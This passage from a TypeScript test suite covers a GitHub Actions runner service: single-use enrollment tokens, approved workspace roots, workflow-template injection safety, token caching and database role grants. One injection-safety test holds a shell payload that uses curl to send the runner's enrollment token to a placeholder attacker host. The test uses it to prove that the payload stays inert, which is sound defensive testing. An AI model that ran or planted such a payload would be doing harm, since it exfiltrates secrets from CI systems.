      ...overrides,
    });

  it("binds the runner's key to the reserved generation", async () => {
    const result = await redeem();
    expect(result.run_id).toBe("run:task-1:1");
    expect(stores.runner("actions:project-1")?.public_key_pem).toBe(publicKeyPem);
    expect(stores.runner("actions:project-1")?.generation).toBe(result.generation);
  });

  it("is single-use: a replay of the same enrollment loses", async () => {
    await redeem();
    await expect(redeem()).rejects.toBeInstanceOf(ActionsExecutionError);
  });

  it("rejects a wrong token without revealing which check failed", async () => {
    await expect(redeem({ enrollment_token: generateEnrollmentToken() })).rejects.toMatchObject({
      code: "invalid_enrollment",
    });
    // Unknown job and unknown runner produce the identical error.
    await expect(redeem({ dispatch_job_id: "dispatch-job:nope" })).rejects.toMatchObject({
      code: "invalid_enrollment",
    });
    await expect(redeem({ runner_id: "actions:other" })).rejects.toMatchObject({
      code: "invalid_enrollment",
    });
  });

  it("rejects a token redeemed against a superseded generation", async () => {
    // A second launch reserves a newer generation; the older job has lost.
    stores.reserveRunnerGeneration("actions:project-1");
    await expect(redeem()).rejects.toMatchObject({ code: "invalid_enrollment" });
  });

  it("rejects every enrollment once the binding is disabled", async () => {
    await repository.setEnabled("binding-1", false);
    await expect(redeem()).rejects.toMatchObject({ code: "invalid_enrollment" });
  });

  it("rejects the previous token after rotation", async () => {
    const rotated = generateEnrollmentToken();
    await repository.storeEnrollmentSecretHash("binding-1", enrollmentTokenHash(rotated));
    await expect(redeem()).rejects.toMatchObject({ code: "invalid_enrollment" });
    await expect(redeem({ enrollment_token: rotated })).resolves.toMatchObject({
      run_id: "run:task-1:1",
    });
  });
});

// ---------------------------------------------------------------------------
// Review follow-ups. These exercise the REAL code paths that were previously
// only covered through mocks, which is why CI stayed green while the ephemeral
// runner could not execute anything and the workflow was injectable.
// ---------------------------------------------------------------------------

describe("the rendered workflow drives the real runner path", () => {
  /**
   * Reproduces exactly what `createV2Executor` does in apps/runner/src/cli.ts:
   * read NORNS_APPROVED_ROOTS_JSON, build an ApprovedRepositoryRegistry from
   * it, and register the checked-out workspace. Uses the real registry from
   * @norns/runner, not a stand-in.
   */
  function registryFrom(approvedRootsJson: string | undefined): ApprovedRepositoryRegistry {
    const roots = JSON.parse(approvedRootsJson ?? "[]") as unknown;
    if (!Array.isArray(roots) || !roots.every((root) => typeof root === "string")) {
      throw new Error("NORNS_APPROVED_ROOTS_JSON must be a JSON string array");
    }
    return new ApprovedRepositoryRegistry(roots);
  }

  /** The value the workflow's `run:` block computes for the approved roots. */
  function approvedRootsFromWorkflow(workspace: string): string {
    return JSON.stringify([workspace]);
  }

  it("regression: an empty allowlist makes the runner unable to execute at all", () => {
    // This is the exact pre-fix state — the template set no approved roots, so
    // the runner defaulted to "[]" and threw on the first dispatched command.
    const workspace = mkdtempSync(join(tmpdir(), "norns-ci-"));
    expect(() =>
      registryFrom(undefined).register({
        repository_binding_id: "binding-1",
        repository_path: workspace,
      }),
    ).toThrow(/outside runner-approved roots/);
  });

  it("accepts the job workspace when the template's approved roots are applied", () => {
    const workspace = mkdtempSync(join(tmpdir(), "norns-ci-"));
    const registry = registryFrom(approvedRootsFromWorkflow(workspace));
    expect(() =>
      registry.register({ repository_binding_id: "binding-1", repository_path: workspace }),
    ).not.toThrow();
    expect(registry.resolve("binding-1")).toBe(realpathSync(workspace));
  });

  it("still refuses a path outside the job workspace", () => {
    // The approved-root check is a real boundary, not a formality: the
    // disposable VM is the isolation boundary, but the runner still only
    // touches the checked-out tree.
    const workspace = mkdtempSync(join(tmpdir(), "norns-ci-"));
    const elsewhere = mkdtempSync(join(tmpdir(), "norns-other-"));
    const registry = registryFrom(approvedRootsFromWorkflow(workspace));
    expect(() =>
      registry.register({ repository_binding_id: "binding-1", repository_path: elsewhere }),
    ).toThrow(/outside runner-approved roots/);
  });

  it("the template actually sets the approved roots the runner reads", () => {
    const rendered = renderNornsAgentWorkflow(TEMPLATE);
    expect(rendered).toContain("NORNS_APPROVED_ROOTS_JSON=");
    expect(rendered).toContain("export NORNS_APPROVED_ROOTS_JSON");
    expect(rendered).toContain("GITHUB_WORKSPACE");
  });
});

describe("workflow template injection safety", () => {
  it("never interpolates a dispatch input inside a run: block", () => {
    const rendered = renderNornsAgentWorkflow(TEMPLATE);
    // Collect every `run:` block and assert none contains a GitHub expression.
    // A dispatcher supplies these values at run time with only repo write, so
    // an expression here is remote code execution plus secret exfiltration.
    const runBlocks = rendered.split("\n").reduce<{ blocks: string[]; indent: number | null }>(
      (state, line) => {
        if (state.indent !== null) {
          const isContinuation = line.trim() === "" || line.search(/\S/) > state.indent;
          if (isContinuation) {
            state.blocks[state.blocks.length - 1] += `\n${line}`;
            return state;
          }
          state.indent = null;
        }
        const match = /^(\s*)run:/.exec(line);
        if (match?.[1] !== undefined) {
          state.blocks.push(line);
          state.indent = match[1].length;
        }
        return state;
      },
      { blocks: [], indent: null },
    ).blocks;

    expect(runBlocks.length).toBeGreaterThan(0);
    for (const block of runBlocks) {
      expect(block).not.toMatch(/\$\{\{/);
    }
  });

  it("binds every dispatch input to an env var referenced as a shell variable", () => {
    const rendered = renderNornsAgentWorkflow(TEMPLATE);
    for (const [variable, input] of [
      ["NORNS_RUNNER_ID", "norns_runner_id"],
      ["NORNS_JOB_ID", "norns_job_id"],
      ["NORNS_RUN_ID", "norns_run_id"],
    ]) {
      expect(rendered).toContain(`${variable}: \${{ inputs.${input} }}`);
      expect(rendered).toContain(`"$${variable}"`);
    }
  });

  it("a shell-injection payload in a dispatch input stays inert data", () => {
    // The payload can only ever arrive through the env binding, and the run
    // script quotes it, so it is an argument value rather than shell syntax.
    const payload = '"; curl -d "$NORNS_RUNNER_ENROLLMENT_TOKEN" https://evil.tld #';
    const rendered = renderNornsAgentWorkflow(TEMPLATE);
    expect(rendered).not.toContain(payload);
    expect(rendered).toContain('--id "$NORNS_RUNNER_ID"');
    expect(rendered).not.toContain('--id "${{');
  });
});

describe("review follow-ups: tokens, ordering, rotation, correlation", () => {
  it("MATERIAL 4: the org administration:write token is never cached", async () => {
    const { github, mintedTokens } = await harness(() => undefined);
    await github.installationToken("5001", GITHUB_TOKEN_SCOPES.createOrganizationRepository);
    await github.installationToken("5001", GITHUB_TOKEN_SCOPES.createOrganizationRepository);
    // Two calls, two mints: nothing installation-wide and admin-privileged is
    // left resident in server memory for the rest of GitHub's one-hour window.
    expect(mintedTokens()).toBe(2);
  });

  it("MATERIAL 4: repository-scoped low-privilege tokens are still cached", async () => {
    const { github, mintedTokens } = await harness(() => undefined);
    await github.installationToken("5001", GITHUB_TOKEN_SCOPES.dispatchWorkflow(42));
    await github.installationToken("5001", GITHUB_TOKEN_SCOPES.dispatchWorkflow(42));
    expect(mintedTokens()).toBe(1);
  });

  it("MINOR 7: correlation does not match a job id by prefix", async () => {
    const runsUrl =
      "https://api.github.com/repos/octo/widgets/actions/workflows/norns-agent.yml/runs";
    const { actions } = await harness((request) =>
      request.url.startsWith(runsUrl)
        ? json({
            workflow_runs: [
              {
                id: 10,
                display_title: nornsRunName("job-10"),
                status: "queued",
                conclusion: null,
                html_url: "https://github.com/octo/widgets/actions/runs/10",
                run_number: 1,
                created_at: "2026-07-21T10:00:00Z",
              },
            ],
          })
        : undefined,
    );
    // Substring matching would have returned run 10 for job-1.
    expect(await actions.findRunForJob(REPOSITORY, "job-1")).toBeNull();
    expect((await actions.findRunForJob(REPOSITORY, "job-10"))?.github_run_id).toBe(10);
  });
});

describe("migration 0017 grants the runtime role what it needs", () => {
  /**
   * Production runs as the restricted `norns_app` role, so a table created
   * without an explicit GRANT is unreachable at runtime even though every
   * migration applied cleanly and every test passed. pglite does enforce
   * privileges under SET ROLE, so this catches the omission that would
   * otherwise only appear in production as `permission denied for table`.
   */
  async function asRuntimeRole(pg: PGlite, sql: string): Promise<void> {
    await pg.exec("SET ROLE norns_app;");
    try {
      await pg.exec(sql);
    } finally {
      await pg.exec("RESET ROLE;");
    }
  }

  it("lets norns_app read, insert, and update both Actions tables", async () => {
    const { pg } = await harness(() => undefined);
    await pg.exec(`
      INSERT INTO projects (
        id, name, description, status, assignment_policy_ref,
        verification_policy_ref, budget_policy_ref
      ) VALUES ('project-1','P','','active','a','v','b');
      INSERT INTO repository_bindings (
        id, project_id, binding_type, status, runner_id, repository_id,
        repository_display_name, github_installation_id, github_owner, github_name,
        granted_permissions, default_branch, verification_policy_ref,
        repository_health, created_by_actor_type, created_by_actor_id
      ) VALUES ('binding-1','project-1','github','connected','actions:project-1','90210',
        'octo/widgets','5001','octo','widgets','{}'::jsonb,'main','v','healthy','human','admin-1');
    `);

    await expect(
      asRuntimeRole(
        pg,
        `INSERT INTO github_actions_execution_bindings (
           repository_binding_id, project_id, connection_id, installation_id,
           repository_github_id, owner, name, default_branch, runner_id
         ) VALUES ('binding-1','project-1','github:5001','5001',90210,'octo','widgets',
           'main','actions:project-1');
         UPDATE github_actions_execution_bindings SET enabled = false
           WHERE repository_binding_id = 'binding-1';
         SELECT 1 FROM github_actions_execution_bindings;`,
      ),
    ).resolves.toBeUndefined();

    await expect(
      asRuntimeRole(
        pg,
        `INSERT INTO github_actions_runs (
           id, project_id, repository_binding_id, dispatch_job_id, run_id, runner_id
         ) VALUES ('actions-run:j','project-1','binding-1','j','run:1','actions:project-1');
         UPDATE github_actions_runs SET status = 'dispatched' WHERE dispatch_job_id = 'j';
         SELECT 1 FROM github_actions_runs;`,
      ),
    ).resolves.toBeUndefined();
  });

  it("does not grant the runtime role DELETE on the append-only run ledger", async () => {
    const { pg } = await harness(() => undefined);
    // The run ledger is audit history. Least privilege means the runtime can
    // append and advance it, but never erase it.
    await expect(asRuntimeRole(pg, "DELETE FROM github_actions_runs;")).rejects.toThrow(
      /permission denied/i,
    );
  });
});
